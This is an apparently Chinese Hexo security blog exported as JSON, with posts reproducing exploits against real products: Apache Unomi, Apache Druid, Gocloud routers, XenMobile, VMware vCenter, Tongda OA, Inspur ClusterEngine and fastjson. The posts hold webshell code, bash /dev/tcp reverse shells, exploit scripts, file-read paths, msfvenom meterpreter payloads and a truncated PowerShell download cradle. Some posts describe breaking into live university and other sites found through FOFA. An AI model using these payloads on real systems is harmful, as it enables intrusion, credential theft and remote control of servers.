{"meta":{"title":"spaceman'blog","subtitle":"","description":"","author":"spaceman","url":"https://spaceman-911.gitee.io","root":"/"},"pages":[{"title":"404","text":"1&lt;style type=&quot;text/css&quot;&gt; .article-header &#123; padding: 0; padding-top: 26px; border-left: none; text-align: center; &#125; .article-header:hover &#123; border-left: none; &#125; .article-title &#123; font-size: 2.1em; &#125; strong a &#123; color: #747474; &#125; .article-meta &#123; display: none; &#125; .share &#123; display: none; &#125; .ds-meta &#123; display: none; &#125; .player &#123; margin-left: -10px; &#125; .sign &#123; text-align: right; font-style: italic; &#125; #page-visit &#123; display: none; &#125; .center &#123; text-align: center; height: 2.5em; font-weight: bold; &#125; .article-entry hr &#123; margin: 0; &#125; .pic &#123; text-align: center; margin: 0; &#125; .pic br &#123; display: none; &#125; #container .article-info-post.article-info &#123; display: none; &#125; #container .article .article-title &#123; padding: 0; &#125;&lt;/style&gt;","path":"/404.html","date":"02-11","excerpt":""},{"title":"About","text":"CTF：会一点 web、misc 渗透：会一点工具的使用和一点实战 战队：Firebasky 后援团 团队：太菜了，暂无 学校：新疆师范大学 爱好：女 特长：划水、脚本梭哈 QQ：1006848997","path":"about/index.html","date":"02-10","excerpt":""},{"title":"分类","text":"","path":"categories/index.html","date":"02-10","excerpt":""},{"title":"search","text":"","path":"search/index.html","date":"02-10","excerpt":""}],"posts":[{"title":"某数字化校园综合管理系统-文件上传getshell","text":"# 某数字化校园综合管理系统 - 文件上传 getshell # 漏洞简介 系统前台企业注册页面存在恶意文件上传漏洞 # 资产查找 FOFA： 1body&#x3D;&quot;DC_Login&#x2F;QYSignUp&quot; # 漏洞复现 点击企业注册 不存在这个链接可直接尝试访问 /DC_Login/QYSignUp 目录 选择上传附件，直接上传 aspx 一句话木马 1&lt;% @Page Language&#x3D;&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;cmd&quot;],&quot;nice!&quot;);%&gt; 成功上传 蚁剑连接 各位白帽子应严格遵守中华人民共和国相关法律法规 。","path":"2021/03/18/某数字化校园综合管理系统-文件上传getshell/","date":"03-18","excerpt":"","tags":[{"name":"getshell","slug":"getshell","permalink":"https://spaceman-911.gitee.io/tags/getshell/"},{"name":"文件上传","slug":"文件上传","permalink":"https://spaceman-911.gitee.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"CVE-2020-13942 Apache Unomi 远程代码执行漏洞","text":"# CVE-2020-13942 Apache Unomi 远程代码执行漏洞 # 漏洞简介 Apache Unomi 是一个 Java 开源客户数据平台，这是一个 Java 服务器，旨在管理客户，潜在顾客和访问者的数据，并帮助个性化客户体验。Unomi 可用于在非常不同的系统（例如 CMS，CRM，问题跟踪器，本机移动应用程序等）中集成个性化和配置文件管理。 在 Apache Unomi 1.5.1 版本之前，攻击者可以通过精心构造的 MVEL 或 ONGl 表达式来发送恶意请求，使得 Unomi 服务器执行任意代码，漏洞对应编号为 CVE-2020-11975，而 CVE-2020-13942 漏洞是对 CVE-2020-11975 漏洞的补丁绕过，攻击者绕过补丁检测的黑名单，发送恶意请求，在服务器执行任意代码。 # 影响版本 Apache Unomi &lt; 1.5.2 # 资产查找 FOFA： 1title&#x3D;&quot;Apache Unomi Welcome Page&quot; # 漏洞复现 post 数据包 payload，ping dnslog 12345678910111213141516171819202122232425POST /context.json HTTP/1.1Host: ipUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1If-None-Match: 1611088794279Content-Length: 259&#123; &quot;filters&quot;: [&#123; &quot;id&quot;: &quot;boom&quot;, &quot;filters&quot;: [&#123; &quot;condition&quot;: &#123; &quot;parameterValues&quot;: &#123; &quot;&quot;: &quot;script::Runtime r = Runtime.getRuntime(); r.exec(&#x27;ping 3xelvq.dnslog.cn&#x27;);&quot; &#125;, &quot;type&quot;: &quot;profilePropertyCondition&quot; &#125; &#125;] &#125;], &quot;sessionId&quot;: &quot;boom&quot;&#125; 反弹 shell，先去编码一下（http://www.jackson-t.ca/runtime-exec-payloads.html） 1bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;vps&#x2F;3344 0&gt;&amp;1 替换 exec 内容，vps 监听，发包 成功获取一个 docker shell（直接好家伙） 附上脚本（from 团长） 1234567891011121314151617181920212223242526272829# @author Firbaskyimport requestsimport jsonMVEL_exp = &#123; &quot;filters&quot;: [ &#123; &quot;id&quot;: &quot;sample&quot;, &quot;filters&quot;: [ &#123; &quot;condition&quot;: &#123; &quot;parameterValues&quot;: &#123; &quot;&quot;: &quot;script::Runtime r = Runtime.getRuntime(); r.exec(&#x27;ping 9309y5.dnslog.cn&#x27;);&quot; &#125;, &quot;type&quot;: &quot;profilePropertyCondition&quot; &#125; &#125; ] &#125; ], &quot;sessionId&quot;: &quot;sample&quot;&#125;url = input(&#x27;Url &gt;&gt;&gt; &#x27;)MVEL_exp = json.dumps(MVEL_exp)headers = &#123;&quot;Content-type&quot;: &quot;application/json&quot;,&quot;Accept&quot;: &quot;*/*&quot;&#125;r = requests.post(url+&quot;/context.json&quot;, data=MVEL_exp, headers=headers,verify=False)print (r.text) # 漏洞修复 升级升级","path":"2021/03/18/CVE-2020-13942-Apache-Unomi-远程代码执行漏洞/","date":"03-18","excerpt":"","tags":[{"name":"CVE","slug":"CVE","permalink":"https://spaceman-911.gitee.io/tags/CVE/"},{"name":"命令执行","slug":"命令执行","permalink":"https://spaceman-911.gitee.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"}]},{"title":"CVE-2020-8949 Gocloud高恪固件RCE","text":"# CVE-2020-8949 Gocloud 高恪固件 RCE # 漏洞简介 Gocloud 路由器，后台 ping 命令存在命令注入，该路由器常用于企业或者网吧 # 影响版本 GOCLOUD S2A_WL - 固件版本 4.2.7.16471 GOCLOUD S2A - 固件版本 4.2.7.17278 GOCLOUD S2A - 固件版本 4.3.0.15815 GOCLOUD S2A - 固件版本 4.3.0.17193 GOCLOUD S3A（K2P MTK 版本）- 固件版本 4.2.7.16528 GOCLOUD S3A - 固件版本 4.3.0.16572 GOCLOUD ISP3000 英特尔 ® 至强 ®E5-2660 - 固件版本 4.3.0.17190 # 漏洞复现 使用弱口令登录：admin/admin 命令注入存在的地方 bp 抓包可查看请求过程 注入 payload 123&#x2F;cgi-bin&#x2F;webui&#x2F;admin&#x2F;tools&#x2F;app_ping&#x2F;diag_ping&#x2F;;ifconfig%202%3E&amp;1;&#x2F;5&#x2F;6&#x2F;a.com_&#x2F;cgi-bin&#x2F;webui&#x2F;admin&#x2F;tools&#x2F;app_ping&#x2F;diag_ping&#x2F;;ifconfig 2&gt;&amp;1;&#x2F;5&#x2F;6&#x2F;a.com_ 执行的是 ifconfig 命令 附上 exp 脚本（来源网络）： 1234567891011121314151617181920212223242526272829303132333435# -*- coding:utf-8 -*-import requestsimport timefrom urllib.parse import quote# 执行命令EXPdef execute_command(command, TARGET): try: url = TARGET + &quot;/cgi-bin/webui&quot; timestamp = str(time.time()).split(&quot;.&quot;)[0] # 创建session request1 = requests.session() login = &#123;&quot;csrftoken&quot;: &quot;MTU5MzQ5NjI5MEdPQ0xPVUQ=&quot;, &quot;password&quot;: &quot;admin&quot;, &quot;timestamp&quot;: &quot;1593496290&quot;, &quot;username&quot;: &quot;admin&quot;&#125; # 发送登录数据 r = request1.post(url, data=login, verify=False, timeout=10) print(r.status_code) url2 = TARGET + quote(&quot;/cgi-bin/webui/admin/tools/app_ping/diag_ping/ ;&quot; + command + &quot; 2&gt;&amp;1; /5/6/a.com_&quot;) r2 = request1.post(url2, verify=False, timeout=10) print(r2.url) print(r2.text) except Exception as e: print(e)if __name__ == &#x27;__main__&#x27;: command = &#x27;id&#x27; url = input(&quot;Url &gt;&gt;&gt; &quot;) while True: execute_command(command,url) command = input(&quot;~$: &quot;)","path":"2021/03/15/CVE-2020-8949-Gocloud高恪固件RCE/","date":"03-15","excerpt":"","tags":[{"name":"CVE","slug":"CVE","permalink":"https://spaceman-911.gitee.io/tags/CVE/"},{"name":"命令执行","slug":"命令执行","permalink":"https://spaceman-911.gitee.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"}]},{"title":"CVE-2020-8209 XenMobile-控制台 任意文件读取","text":"# CVE-2020-8209 XenMobile - 控制台 任意文件读取 # 漏洞简介 XenMobile 是 Citrix 开发的企业移动性管理软件。该产品允许企业管理员工的移动设备和移动应用程序。该软件的目的是通过允许员工安全地在企业拥有的和个人移动设备及应用程序上工作来提高生产率。 Citrix Endpoint Management 存在 任意文件读取漏洞，远程未授权攻击者通过发送特制 HTTP 请求，可以造成读取受影响设备上任意文件的影响。 # 影响版本 XenMobile Server &lt; 10.12 RP2 XenMobile Server &lt; 10.11 RP4 XenMobile Server &lt; 10.10 RP6 XenMobile Server &lt; 10.9 RP5 # 资产查找 FOFA： 1app&#x3D;&quot;XenMobile-控制台&quot; 国外站点较多 payload： 12http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;jsp&#x2F;help-sb-download.jsp?sbFileName&#x3D;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwdhttp:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;jsp&#x2F;help-sb-download.jsp?sbFileName&#x3D;..&#x2F;..&#x2F;..&#x2F;opt&#x2F;sas&#x2F;sw&#x2F;config&#x2F;sftu.properties 批量检测如下：","path":"2021/03/15/CVE-2020-8209-XenMobile-控制台-任意文件读取/","date":"03-15","excerpt":"","tags":[{"name":"CVE","slug":"CVE","permalink":"https://spaceman-911.gitee.io/tags/CVE/"},{"name":"任意文件读取","slug":"任意文件读取","permalink":"https://spaceman-911.gitee.io/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"}]},{"title":"通达OA v11.7 在线任意用户登录","text":"# 通达 OA v11.7 在线任意用户登录 # 漏洞描述 需要有在线用户才能登录 # 资产查找 FOFA： 1app&#x3D;&quot;TDXK-通达OA&quot; # 漏洞复现 首先访问： 1http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;mobile&#x2F;auth_mobi.php?isAvatar&#x3D;1&amp;uid&#x3D;1&amp;P_VER&#x3D;0 页面空白则表示用户在线，并且此时已经获取到了 cookie 返回显示 RELOGIN ，则不在线 若在线，则访问成功登录 uid 为 1 的用户，也就是管理员用户 exp 脚本如下（来源网络）： 1234567891011121314151617181920212223import requestsfrom bs4 import BeautifulSoupimport sysimport reurl = &quot;http://127.0.0.1/&quot;for i in range(1,600): try : vuln_url = url + &quot;/mobile/auth_mobi.php?isAvatar=1&amp;uid=&quot;+str(i)+&quot;&amp;P_VER=0&quot; resp = requests.get(vuln_url) soup = BeautifulSoup(resp.text,&#x27;html.parser&#x27;) if &#x27;RELOGIN&#x27; in soup.get_text(): print(i,&quot;不存在&quot;) else: PHPSESSION = re.findall(r&#x27;PHPSESSID=(.*?);&#x27;, str(resp.headers)) print(&#x27;uid = &#x27;+str(i)+&quot; 在线，COOKIE值是：PHPSESSID=&quot;+str(PHPSESSION[0])) print(url+&quot;/mobile/auth_mobi.php?isAvatar=1&amp;uid=&quot;+str(i)+&quot;&amp;P_VER=0&quot;) print(url+&quot;/general/&quot;) break except: print(&#x27;站点不存在漏洞!&#x27;) break 管理员用户 其他用户","path":"2021/03/15/通达OA-v11-7-在线任意用户登录/","date":"03-15","excerpt":"","tags":[{"name":"权限","slug":"权限","permalink":"https://spaceman-911.gitee.io/tags/%E6%9D%83%E9%99%90/"}]},{"title":"Apache Axis2 后台文件上传","text":"Apache Axis2 后台文件上传简介Axis是一个开源、基于XML的Web服务架构。最开始由IBM公司研发,叫IBM-SOAP。后来由Apache基金会在SOAP的基础上推出了AXIS。AXIS本质是一个Java语言编写的SOAP引擎。利用它我们可以在各种分布式应用中,让各个应用能够彼此操作、交互。 漏洞复现默认后台路径：/axis2-admin/login 默认账号密码：admin/axis2 工具下载地址： https://github.com/CaledoniaProject/AxisInvoker 访问后台地址，使用默认密码成功登录， 点击Upload Service上传aar包进行命令执行 上传工具中 build目录中的 aar 包，成功上传 命令执行windows 或 linux 均可正常执行 根据工具md文档操作如下 运行命令： 1http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;axis2&#x2F;services&#x2F;AxisInvoker&#x2F;exec?cmd&#x3D;whoami 写文件： 1http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;axis2&#x2F;services&#x2F;AxisInvoker&#x2F;write?path&#x3D;c:\\566.txt&amp;content&#x3D;123 读取文件： 1http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;axis2&#x2F;services&#x2F;AxisInvoker&#x2F;read?path&#x3D;c:\\566.txt 下载文件并将其保存 1http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;axis2&#x2F;services&#x2F;AxisInvoker&#x2F;download?url&#x3D;http:&#x2F;&#x2F;www.baidu.com&amp;file&#x3D;c:\\123.txt","path":"2021/03/15/Apache-Axis2-后台文件上传/","date":"03-15","excerpt":"","tags":[{"name":"getshell","slug":"getshell","permalink":"https://spaceman-911.gitee.io/tags/getshell/"}]},{"title":"CVE-2021-25646 Apache Druid远程代码执行","text":"# CVE-2021-25646 Apache Druid 远程代码执行 # 漏洞描述 Apache Druid 包括执行用户提供的 JavaScript 的功能嵌入在各种类型请求中的代码。此功能在用于高信任度环境中，默认已被禁用。但是，在 Druid 0.20.0 及更低版本中，经过身份验证的用户发送恶意请求，利用 Apache Druid 漏洞可以执行任意代码。攻击者可直接构造恶意请求执行任意代码，控制服务器。 # 影响版本 Apache Druid &lt; 0.20.1 # 资产查找 FOFA： 1title&#x3D;&quot;Apache Druid&quot; # 漏洞复现 访问目录 /druid/indexer/v1/sampler ，空白页面 bp 抓包，如下 注意修改 Content-Type # payload1，ping dnslog 1234567891011121314151617181920212223242526272829303132333435363738394041POST &#x2F;druid&#x2F;indexer&#x2F;v1&#x2F;sampler HTTP&#x2F;1.1Content-Type: application&#x2F;json;charset&#x3D;utf-8&#123; &quot;type&quot;:&quot;index&quot;,&quot;spec&quot;:&#123; &quot;type&quot;:&quot;index&quot;, &quot;ioConfig&quot;:&#123; &quot;type&quot;:&quot;index&quot;,&quot;inputSource&quot;:&#123; &quot;type&quot;:&quot;http&quot;, &quot;uris&quot;:[&quot;https:&#x2F;&#x2F;www.baidu.com&quot;] &#125;,&quot;inputFormat&quot;:&#123; &quot;type&quot;:&quot;tsv&quot;, &quot;findColumnsFromHeader&quot;:true &#125; &#125;,&quot;dataSchema&quot;:&#123; &quot;dataSource&quot;:&quot;sample&quot;, &quot;timestampSpec&quot;:&#123; &quot;column&quot;:&quot;timestamp&quot;, &quot;missingValue&quot;:&quot;2010-01-01T00:00:00Z&quot; &#125;,&quot;dimensionsSpec&quot;:&#123;&#125;, &quot;transformSpec&quot;:&#123; &quot;transforms&quot;:[], &quot;filter&quot;:&#123; &quot;type&quot;: &quot;javascript&quot;, &quot;function&quot;: &quot;function(value)&#123;return java.lang.Runtime.getRuntime().exec(&#39;&#x2F;bin&#x2F;bash -c $@|bash 0 ping 8bx520.dnslog.cn&#39;)&#125;&quot;, &quot;dimension&quot;: &quot;added&quot;, &quot;&quot;: &#123; &quot;enabled&quot;: &quot;true&quot; &#125; &#125; &#125; &#125;,&quot;type&quot;:&quot;index&quot;, &quot;tuningConfig&quot;:&#123; &quot;type&quot;:&quot;index&quot; &#125; &#125;,&quot;samplerConfig&quot;:&#123; &quot;numRows&quot;:50, &quot;timeoutMs&quot;:10000 &#125;&#125; 响应包 dnslog 反弹 shell，将 exec 内容改为 1&#x2F;bin&#x2F;bash -c $@|bash 0 echo bash -i &gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;3344 0&gt;&amp;1 # payload2，回显 123456789101112131415161718192021222324252627&#123; &quot;type&quot;: &quot;index&quot;, &quot;spec&quot;: &#123; &quot;ioConfig&quot;: &#123; &quot;type&quot;: &quot;index&quot;, &quot;firehose&quot;: &#123; &quot;type&quot;: &quot;local&quot;, &quot;baseDir&quot;: &quot;&#x2F;etc&quot;, &quot;filter&quot;: &quot;passwd&quot; &#125; &#125;, &quot;dataSchema&quot;: &#123; &quot;dataSource&quot;: &quot;%%DATASOURCE%%&quot;, &quot;parser&quot;: &#123; &quot;parseSpec&quot;: &#123; &quot;format&quot;: &quot;javascript&quot;, &quot;timestampSpec&quot;: &#123;&#125;, &quot;dimensionsSpec&quot;: &#123;&#125;, &quot;function&quot;: &quot;function()&#123;var s &#x3D; new java.util.Scanner(java.lang.Runtime.getRuntime().exec(&#39;id&#39;).getInputStream()).useDelimiter(\\&quot;\\\\A\\&quot;).next();return &#123;timestamp:\\&quot;2013-09-01T12:41:27Z\\&quot;,test: s&#125;&#125;&quot;, &quot;&quot;: &#123; &quot;enabled&quot;: &quot;true&quot; &#125; &#125; &#125; &#125; &#125;&#125; 回显 id # Finally 以上仅为验证漏洞，切勿其他操作，年轻人耗子为之，造成影响与作者无关。","path":"2021/03/15/CVE-2021-25646-Apache-Druid远程代码执行/","date":"03-15","excerpt":"","tags":[{"name":"CVE","slug":"CVE","permalink":"https://spaceman-911.gitee.io/tags/CVE/"}]},{"title":"VMware vCenter Server 任意文件读取","text":"VMware vCenter Server 任意文件读取漏洞描述VMware vCenter存在任意文件读取漏洞，远程攻击者通过访问开放在外部的vCenter 控制台，可以任意读取主机上的文件。(可读取 vCenter 配置文件获得管理帐号密码)进而控制 vCenter 平台及其管理的虚拟机集群。 影响版本 VMware vCenter Server 6.5.0 a至f版 资产查找 FOFA： 1title&#x3D;&quot;ID_VC_Welcome&quot; payload： 123456windows：https:&#x2F;&#x2F;ip&#x2F;eam&#x2F;vib?id&#x3D;C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx\\vcdb.propertieshttps:&#x2F;&#x2F;ip&#x2F;eam&#x2F;vib?id&#x3D;C:&#x2F;windows&#x2F;win.inilinux:https:&#x2F;&#x2F;ip&#x2F;eam&#x2F;vib?id&#x3D;&#x2F;etc&#x2F;passwd 2016以上测试失败 漏洞修复升级版本","path":"2021/03/14/VMware-vCenter-Server-任意文件读取/","date":"03-14","excerpt":"","tags":[{"name":"任意文件读取","slug":"任意文件读取","permalink":"https://spaceman-911.gitee.io/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"}]},{"title":"锐捷RG-UAC统一上网行为管理审计系统信息泄露漏洞","text":"锐捷RG-UAC统一上网行为管理审计系统信息泄露漏洞2021年3月8日，锐捷RG-UAC统一上网行为管理审计系统存在信息泄露漏洞，攻击者可以通过审查网页源代码获取到用户账号和密码，导致管理员用户认证信息泄露。 FOFA语法： 1title&#x3D;&quot;RG-UAC登录页面&quot; &amp;&amp; body&#x3D;&quot;admin&quot; 打开到登录页面，右键查看源码，搜索admin md5解密 输入admin用户以及破解的密码，成功登录后台 修复方式：更新系统版本","path":"2021/03/14/锐捷RG-UAC统一上网行为管理审计系统信息泄露漏洞/","date":"03-14","excerpt":"","tags":[{"name":"信息泄露","slug":"信息泄露","permalink":"https://spaceman-911.gitee.io/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"}]},{"title":"弱密码中发现的授权绕过","text":"# 弱密码中发现的授权绕过 某次 edu 测试中发现的，fofa 随便找一个学院的后台，发现一个前端写的不怎样的后台，看着就很 lo，直接尝试弱密码登录，直接成功登录，里面是一些招生数据 甚至还有一些学生的详细信息，如家庭地址，直接好家伙，注入我并未测试 于是尝试是否存在未授权，另一个浏览器不登录直接访问某个文件，竟然直接没有验证 啊这？不验证？那登陆的意义是啥？于是我尝试访问默认页面 default.aspx，发现 500 错误，直接猜测只验证了 default.aspx 页面，其他页面没有验证 正常成功登录如下 于是尝试登陆的时候抓包看看，抓取成功登录时的 cookie，% e7% ae% a1% e7%90%86% e5%91%98 是 url 编码，解码是 管理员 嗯？仅仅是 set 而已？那岂不是无需登录，设置 cookie 即可登录？于是我尝试不登录，直接带这个 cookie 访问 default.aspx 页面 成功来到后台 感觉是蛮重要的系统的，怎么后端就这么。。。按照这样，那应该也会存在注入啥的，由于之前提交漏洞了，现在也无法访问了也就没得再测试。 # 总结 在登陆的时候也看看返回包，尝试修改或许有收获 对比成功登录与登录失败，或许发现其中的 cookie 的不合理","path":"2021/03/11/弱密码中发现的授权绕过/","date":"03-11","excerpt":"","tags":[{"name":"权限","slug":"权限","permalink":"https://spaceman-911.gitee.io/tags/%E6%9D%83%E9%99%90/"}]},{"title":"浪潮ClusterEngine4.0集群管理系统前台RCE","text":"# 浪潮 ClusterEngine4.0 集群管理系统前台 RCE 正当我又是在摸鱼的时候，空白（ crazygod ）发来了浪潮 ClusterEngine4.0 集群管理系统前台 RCE 的 payload，嗯？那我这不得直接去复现？说干就干，fofa 一波， payload： 123POST &#x2F;loginop&#x3D;login&amp;username&#x3D;1 2\\&#39;,\\&#39;1\\&#39;\\); &#96;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F&#123;反弹shellIP&#125;%2F80%200%3E%261&#96; 找了几个站点均抓包失败，想必是修复了，一抓包就服务器连接失败，我这脾气，直接下一个，终于到了一个可以抓包的了 首先需要 vps 开启监听 nc -lvp 3344 然后开始登陆抓包，构造 payload，go post 数据包如下： 123456789101112131415POST &#x2F;login HTTP&#x2F;1.1Host: ipUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko&#x2F;20100101 Firefox&#x2F;86.0Accept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2Accept-Encoding: gzip, deflateContent-Type: application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8X-Requested-With: XMLHttpRequestContent-Length: 103Origin: https:&#x2F;&#x2F;ipConnection: closeReferer: https:&#x2F;&#x2F;ip&#x2F;module&#x2F;login&#x2F;login.htmlCookie: lang&#x3D;cnop&#x3D;login&amp;username&#x3D;1%202\\&#39;,\\&#39;1\\&#39;\\);&#96;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F***.**.**.***%2F3344%200%3E%261&#96; 发包成功获取 root 权限 至于原理咱也不是很懂，导致命令执行，源码啥的我也没去看过，只能等空白大佬带我们分析分析了","path":"2021/03/11/浪潮ClusterEngine4-0集群管理系统前台RCE/","date":"03-11","excerpt":"","tags":[{"name":"getshell","slug":"getshell","permalink":"https://spaceman-911.gitee.io/tags/getshell/"}]},{"title":"一次fastjson反序列化-实战","text":"# 一次 fastjson 反序列化 - 实战 爪哇一窍不通的我，某次找到一个高校的站点 随便登录抓包，发现是 json 请求 于是尝试使用 Bp 插件 Fastjsonscan 扫描 这不是 fastjson 反序列化漏洞吗，工具梭哈，首先生成编码后的反弹 shell 生成编码后的反弹 shell（编码地址：http://www.jackson-t.ca/runtime-exec-payloads.html） 1bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;vpsip&#x2F;3344 0&gt;&amp;1 使用 rce 工具（ https://github.com/wyzxxz/fastjson_rce_tool ），在 vps 上运行 rce 工具 1java -cp fastjson_tool.jar fastjson.LDAPRefServer2 1099 CommonsCollections5 &quot;编码后的bash&quot; 再开启一个终端 vps 监听 3344 端口，bp 改包发送数据 1&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;vps:1099&#x2F;Object&quot;,&quot;autoCommit&quot;:true&#125; 成功反弹 shell # 总结 原理或许不知道，但是可以尝试工具梭哈，脚本小子就是我 多看大佬的文章，最新的漏洞，在实战时有很大的帮助","path":"2021/02/23/一次fastjson反序列化-实战/","date":"02-23","excerpt":"","tags":[{"name":"getshell","slug":"getshell","permalink":"https://spaceman-911.gitee.io/tags/getshell/"}]},{"title":"从一次文件下载到getshell","text":"# 从一次文件下载到 getshell 由于没有实战过任意文件下载，于是去 gogo 了一下，发现一个任意文件下的地址： http://www.xxx.cn/down.php?file=download/xxxx.pdf 随便输入一个文件看看 好家伙，bt 默认不开启这个，但是通过这个报错我们也知道路径了，于是就下载一个 index.php 通过这个文件，找到了其他的文件，重要的文件不就是数据库配置文件吗 下载这个配置，得到后台地址和数据库登录信息等 直接尝试连接（ip 直接 whois 查询），进入 admin 表，直接好家伙，密码还是明文 通过刚刚得到的后台地址，直接进行登录 产品配置发现一个上传点，直接选择添加，直接上传 php 文件，直接被过滤，说是非图片类型，难道是 mime 检测而已？直接尝试修改 Content-Type 头，成功上传 右键查看图片，getshell # 总结 有下载的地方尝试或许有惊喜 读读源码，前端漂亮的站点，有时候后台没做到位 摸鱼完了，又水了一篇，有时候不能想太多，但需要多多尝试，但要适而可止","path":"2021/02/23/从一次文件下载到getshell/","date":"02-23","excerpt":"","tags":[{"name":"getshell","slug":"getshell","permalink":"https://spaceman-911.gitee.io/tags/getshell/"}]},{"title":"MSF+FRP实现远程渗透","text":"# MSF-FRP 实现远程渗透 首先下载 frp 工具（https://github.com/fatedier/frp/releases），放至 vps 和 kali，我的 vps 是 centos7，所以我选择的是 frp_0.35.1_linux_386.tar.gz ，若不了解自己 vps 的体系结构可参考 linux 系统的体系结构：https://blog.csdn.net/lixuande19871015/article/details/90485929 frp 支持的 linux 的架构 ：https://blog.csdn.net/lixuande19871015/article/details/98613711 # 0x01 vps 服务端的配置 下载 frp 解压至 vps ，编辑 frps.ini 文件，编辑时请勿带注释 12345678[common]bind_addr &#x3D; 0.0.0.0bind_port &#x3D; 6531 #frp连接端口dashboard_addr &#x3D; 0.0.0.0dashboard_port &#x3D; 7500 #网页访问端口dashboard_user &#x3D; admin #用户名dashboard_pwd &#x3D; password #密码token &#x3D; spaceman #frp连接口令 完成配置，启动服务端 前台启动： ./frps -c frps.ini 后台启动： nohup ./frps -c frps.ini &gt; log.txt &amp; 可登录图形化界面 ip:7500，记得防火墙开启这几个端口 # 0x02 kali 客户端的配置 下载 frp 解压至 kali，编辑 frpc.ini 文件 123456789[common]server_addr &#x3D; 81.xx.xx.xx #vps的ipserver_port &#x3D; 6531 #连接frp的端口token &#x3D; spaceman #连接frp的口令[msf]type &#x3D; tcp #连接协议local_ip &#x3D; 127.0.0.1 #本地iplocal_port &#x3D; 6759 #本地转发vps端口remote_port &#x3D; 6000 #访问端口，也是木马的端口 启动 frpc， ./frps -c frps.ini vps 连接成功 kali 连接成功 木马制作 1msfvenom -a x86 --platform Windows -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;vps LPORT&#x3D;6000 -e x86&#x2F;shikata_ga_nai -b &#39;\\x00\\x0a\\xff&#39; -i 15 -f exe -o shell.exe msf 设置监听 12345use exploit&#x2F;multi&#x2F;handlerset payload windows&#x2F;meterpreter&#x2F;reverse_tcpset lhost 127.0.0.1set lport 6759run 远程小伙伴运行木马测试，成功","path":"2021/02/15/MSF-FRP实现远程渗透/","date":"02-15","excerpt":"","tags":[{"name":"MSF","slug":"MSF","permalink":"https://spaceman-911.gitee.io/tags/MSF/"}]},{"title":"CVE-2017-8464远程命令执行漏洞复现","text":"# CVE-2017-8464 远程命令执行漏洞复现 # 漏洞描述 2017 年 6 月 13 日，微软官方发布编号为 CVE-2017-8464 的漏洞公告，官方介绍 Windows 系统在解析快捷方式时存在远程执行任意代码的高危漏洞，黑客可以通过 U 盘、网络共享等途径触发漏洞，完全控制用户系统，安全风险高危 Windows 系统通过解析 .LNK 后缀文件时，是使用二进制来解析的，而当恶意的二进制代码被系统识别执行的时候就可以实现远程代码执行，由于是在 explorer.exe 进程中运行的，所以 load 进内存的时候与当前用户具有相同的权限。 于是攻击者利用这一解析过程的漏洞，将包含恶意二进制的代码被附带进可移动驱动器 (或远程共享过程中)，受害者使用 powershell 解析 .LNK 文件后就会被黑客所控制。 成功利用此漏洞的攻击者可能会获得与本地用户相同的用户权限。 # 影响版本 123456789windows 7windows 8windows 8.1windows 10windows server 2008windows server 2008 R2windows server 2012windows server 2012 R2windows server 2016 # 环境准备 攻击机：kali IP：192.168.30.154 靶机：Windows 7 X64 IP：192.168.30.153 # 漏洞复现 使用 kali msfvenom 生成一个反弹 shell 1root@kali911:~# msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.30.154 LPORT&#x3D;5656 -f psh-reflection&gt;&#x2F;var&#x2F;www&#x2F;html&#x2F;hack.ps1 这里生成至 /var/www/html 目录下 启动 Apache 服务 12root@kali911:~# service apache2 restart root@kali911:~# service apache2 status 浏览器打开该文件，查看是否成功 1http:&#x2F;&#x2F;127.0.0.1&#x2F;hack.ps1 启动 msf 1root@kali911:~# msfconsole 使用监听模块 multi/handler 1msf5 &gt; use exploit&#x2F;multi&#x2F;handler 指定 kali 攻击机 IP 1msf5 exploit(multi&#x2F;handler) &gt; set LHOST 192.168.30.154 设置端口 1msf5 exploit(multi&#x2F;handler) &gt; set LPORT 5656 设置返回载荷 1msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp 靶机创建快捷键（桌面右键 -&gt; 新建 -&gt; 快捷方式），输入以下内容 1powershell -windowstyle hidden -exec bypass -c &quot;IEX (New-Object 